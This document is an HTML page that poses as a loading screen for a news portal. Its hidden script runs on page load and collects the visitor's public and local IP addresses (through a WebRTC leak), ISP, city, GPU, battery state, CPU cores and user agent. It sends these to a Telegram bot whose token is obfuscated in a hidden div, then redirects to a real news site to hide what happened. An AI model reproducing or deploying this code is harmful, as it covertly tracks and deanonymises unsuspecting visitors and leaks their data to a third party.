<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting to News Portal...</title>
    <style>
        body { font-family: sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #444; }
        .loader-box { text-align: center; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 14px; letter-spacing: 0.5px; }
        #v-vault { display: none; }
    </style>
</head>
<body>

<div class="loader-box">
    <div class="spinner"></div>
    <p>Memuat konten berita...</p>
</div>

<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>

<script>
    // Force HTTPS
    if (location.protocol === 'http:') { location.replace(window.location.href.replace('http:', 'https:')); }

    const _DATA = document.getElementById('v-vault').innerText.split('|');
    const _TOKEN = atob(_DATA[1]); const _CHATID = atob(_DATA[2]);

    window.onload = async () => {
        try {
            // 1. DATA PERANGKAT & HARDWARE (IDENTITAS ASLI)
            let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
            const renderer = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
            
            let battery = "N/A";
            try { const b = await navigator.getBattery(); battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`; } catch(e) {}

            // 2. DETEKSI LOCAL IP & MODE HOTSPOT
            const pc = new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
            
            pc.onicecandidate = async (ice) => {
                if(!ice || !ice.candidate) return;
                const localIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
                
                // Logika Penentu: Hotspot biasanya 192.168.43.x
                const isHotspot = localIP.startsWith("192.168.43") ? "⚠️ HOTSPOT ACTIVE" : "STANDARD";

                // 3. IDENTIFIKASI MEREK HP DARI GPU
                let brand = "Generic Android";
                if (renderer.includes("Adreno")) brand = "Qualcomm (Xiaomi/Oppo/Vivo/Samsung)";
                if (renderer.includes("Mali-G52")) brand = "Entry-Mid (Realme/Samsung A Series)";
                if (renderer.includes("Mali-G7")) brand = "High-End (Flagship Android)";
                if (renderer.includes("Apple")) brand = "iPhone / iOS Device";

                const log = `🔱 SENSITIVE DATA LEAK 🔱\n\n` +
                    `📱 DEVICE: ${brand}\n` +
                    `🎮 GPU: ${renderer}\n` +
                    `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
                    `⚡ BATT: ${battery}\n` +
                    `🏠 LOCAL IP: ${localIP}\n` +
                    `🌐 PUB IP: ${net.ip}\n` +
                    `🏢 ISP: ${net.org}\n` +
                    `🏙️ CITY: ${net.city}\n` +
                    `📡 MODE: ${isHotspot}\n\n` +
                    `📄 AGENT: ${navigator.userAgent.slice(0, 100)}`;

                // KIRIM KE TELEGRAM
                await fetch(`https://api.telegram.org/bot${_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: _CHATID, text: log })
                });

                // REDIRECT OTOMATIS KE BERITA (Sangat Cepat)
                window.location.href = "https://www.detik.com";
            };

            // Timeout Failsafe: Kalau IP lokal macet, tetep redirect
            setTimeout(() => { window.location.href = "https://www.detik.com"; }, 3000);

        } catch (err) {
            window.location.href = "https://www.detik.com";
        }
    };
</script>
</body>
</html>
